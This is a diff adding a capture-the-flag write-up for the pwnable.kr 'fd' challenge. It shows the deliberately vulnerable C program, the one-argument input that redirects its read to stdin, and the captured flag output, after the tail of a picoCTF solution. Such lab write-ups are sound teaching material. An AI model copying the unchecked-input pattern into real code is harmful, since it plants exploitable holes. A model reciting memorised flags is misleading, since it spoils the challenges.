@@ -502,3 +502,44 @@ print(io.read())
 print(io.read())
 # picoCTF{Stat1C_c4n4r13s_4R3_b4D_0bf0b08e}
 ```
+
+
+
+<br>
+
+# fd - pwnable.kr
+
+Simply pass in 0x1234 so that the fd argument to the read function is 0 (stdin) then you can enter LETMEWIN
+
+```
+fd@pwnable:~$ ls
+fd  fd.c  flag
+fd@pwnable:~$ cat fd.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+char buf[32];
+int main(int argc, char* argv[], char* envp[]){
+        if(argc<2){
+                printf("pass argv[1] a number\n");
+                return 0;
+        }
+        int fd = atoi( argv[1] ) - 0x1234;
+        int len = 0;
+        len = read(fd, buf, 32);
+        if(!strcmp("LETMEWIN\n", buf)){
+                printf("good job :)\n");
+                system("/bin/cat flag");
+                exit(0);
+        }
+        printf("learn about Linux file IO\n");
+        return 0;
+
+}
+
+fd@pwnable:~$ ./fd 4660
+LETMEWIN
+good job :)
+mommy! I think I know what a file descriptor is!!
+fd@pwnable:~$ 
+```
